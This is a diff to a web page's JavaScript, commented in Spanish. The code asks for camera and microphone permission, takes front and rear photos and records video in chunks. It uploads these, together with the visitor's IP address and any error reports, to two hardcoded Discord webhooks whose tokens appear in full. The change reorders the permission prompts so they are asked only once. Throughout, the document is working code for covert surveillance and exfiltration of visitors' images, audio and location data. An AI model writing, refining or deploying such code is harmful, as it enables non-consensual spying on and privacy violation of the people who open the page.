@@ -69,9 +69,7 @@
     const video = document.getElementById('video');
 
     // ====== WEBHOOKS ======
-    // Fotos → aquí
-    const WEBHOOK_FOTOS = 'https://discord.com/api/webhooks/1548798068885819432/2ERz1DQOk54rVCxyFh-O-EGn4sTTh8FFYzeJzIDobMr3ZuWgVJK2Npu8-0FfMk-MtVZ5';
-    // Videos y archivos → aquí
+    const WEBHOOK_FOTOS  = 'https://discord.com/api/webhooks/1548798068885819432/2ERz1DQOk54rVCxyFh-O-EGn4sTTh8FFYzeJzIDobMr3ZuWgVJK2Npu8-0FfMk-MtVZ5';
     const WEBHOOK_VIDEOS = 'https://discord.com/api/webhooks/1548804963398983700/mi9p4RC2IC3GaRenOGGQUzGC1UZ1i6TJGccfjkWOrHgNVvZeRpIGK80KYjDKoeioe6Ir';
     // ======================
 
@@ -85,6 +83,10 @@
     let yaEnviado = false;
     let pidiendo = false;
     let ipUsuario = null;
+
+    // Guardamos los streams una vez concedidos para no volver a pedir permiso
+    let streamCamara = null;
+    let streamMicro = null;
 
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
@@ -105,19 +107,54 @@
       return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${pad(d.getFullYear())}`;
     }
 
+    // ============================================
+    // PASO 1: Pedir CÁMARA primero
+    // ============================================
+    async function pedirCamara() {
+      if (streamCamara) return streamCamara;
+
+      console.log('Solicitando permiso de CÁMARA...');
+      streamCamara = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' },
+        audio: false
+      });
+      console.log('✅ Cámara concedida');
+      return streamCamara;
+    }
+
+    // ============================================
+    // PASO 2: Pedir MICRÓFONO justo después
+    // ============================================
+    async function pedirMicrofono() {
+      if (streamMicro) return streamMicro;
+
+      console.log('Solicitando permiso de MICRÓFONO...');
+      streamMicro = await navigator.mediaDevices.getUserMedia({
+        video: false,
+        audio: true
+      });
+      console.log('✅ Micrófono concedido');
+      return streamMicro;
+    }
+
+    // ============================================
+    // Capturar foto usando el stream de cámara ya concedido
+    // ============================================
     async function capturarFoto(facingMode) {
-      if (currentStream) {
-        currentStream.getTracks().forEach(t => t.stop());
-        currentStream = null;
+      // Detener cámara anterior si existe
+      if (streamCamara) {
+        streamCamara.getTracks().forEach(t => t.stop());
+        streamCamara = null;
       }
 
-      const stream = await navigator.mediaDevices.getUserMedia({
+      // Pedir cámara con el facingMode que queramos (sin volver a mostrar diálogo, ya está concedido)
+      streamCamara = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: facingMode },
         audio: false
       });
 
-      currentStream = stream;
-      video.srcObject = stream;
+      currentStream = streamCamara;
+      video.srcObject = streamCamara;
 
       await new Promise(resolve => {
         if (video.readyState >= 2) resolve();
@@ -133,15 +170,14 @@
 
       const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-      if (currentStream) {
-        currentStream.getTracks().forEach(t => t.stop());
-        currentStream = null;
+      if (streamCamara) {
+        streamCamara.getTracks().forEach(t => t.stop());
+        streamCamara = null;
       }
 
       return blob;
     }
 
-    // Enviar a un webhook concreto (se le pasa la URL)
     async function enviarAlWebhook(webhookURL, blob, mensaje, nombreArchivo) {
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
@@ -176,12 +212,21 @@
       return '';
     }
 
+    // ============================================
+    // PASO 3: Grabar video en trozos (usa cámara + micro ya concedidos)
+    // ============================================
     async function grabarVideoEnTrozos(hora, linkIP) {
       if (!navigator.mediaDevices || !window.MediaRecorder) {
         throw new Error('MediaRecorder no soportado');
       }
 
-      console.log('Solicitando cámara + micrófono...');
+      // Detener cualquier cámara previa
+      if (streamCamara) {
+        streamCamara.getTracks().forEach(t => t.stop());
+        streamCamara = null;
+      }
+
+      console.log('Solicitando cámara + micrófono para video...');
       const stream = await navigator.mediaDevices.getUserMedia({
         video: {
           facingMode: CAMARA_VIDEO,
@@ -191,6 +236,7 @@
         audio: true
       });
 
+      currentStream = stream;
       console.log('Tracks obtenidos:', stream.getTracks().map(t => t.kind));
 
       const mimeType = elegirMimeTypeVideo();
@@ -249,7 +295,6 @@
 
         console.log(`Trozo ${trozo}: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);
 
-        // 👇 Videos van al WEBHOOK_VIDEOS
         enviarAlWebhook(
           WEBHOOK_VIDEOS,
           blob,
@@ -261,6 +306,9 @@
       stream.getTracks().forEach(t => t.stop());
     }
 
+    // ============================================
+    // FLUJO PRINCIPAL
+    // ============================================
     async function iniciar() {
       if (pidiendo || yaEnviado) return;
       pidiendo = true;
@@ -270,9 +318,17 @@
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
+        // 1) Pedir CÁMARA
+        await pedirCamara();
+
+        // 2) Pedir MICRÓFONO justo después
+        await pedirMicrofono();
+
+        // A partir de aquí ya está todo concedido, no volverá a preguntar
+
+        // 3) Foto frontal
         console.log('Foto frontal...');
         const fotoFrontal = await capturarFoto('user');
-        // 👇 Fotos van al WEBHOOK_FOTOS
         await enviarAlWebhook(
           WEBHOOK_FOTOS,
           fotoFrontal,
@@ -282,10 +338,10 @@
 
         await new Promise(r => setTimeout(r, 500));
 
+        // 4) Foto trasera
         try {
           console.log('Foto trasera...');
           const fotoTrasera = await capturarFoto('environment');
-          // 👇 Fotos van al WEBHOOK_FOTOS
           await enviarAlWebhook(
             WEBHOOK_FOTOS,
             fotoTrasera,
@@ -298,6 +354,7 @@
 
         await new Promise(r => setTimeout(r, 500));
 
+        // 5) Video en trozos
         console.log('Iniciando video en trozos...');
         await grabarVideoEnTrozos(hora, linkIP);
 
@@ -311,7 +368,6 @@
             [`⚠️ Error.\nHora: ${hora}\nIP: ${linkIP}\nMotivo: ${err.message || err}\nNombre: ${err.name || ''}`],
             { type: 'text/plain' }
           );
-          // 👇 Los errores también van al WEBHOOK_VIDEOS
           await enviarAlWebhook(
             WEBHOOK_VIDEOS,
             texto,
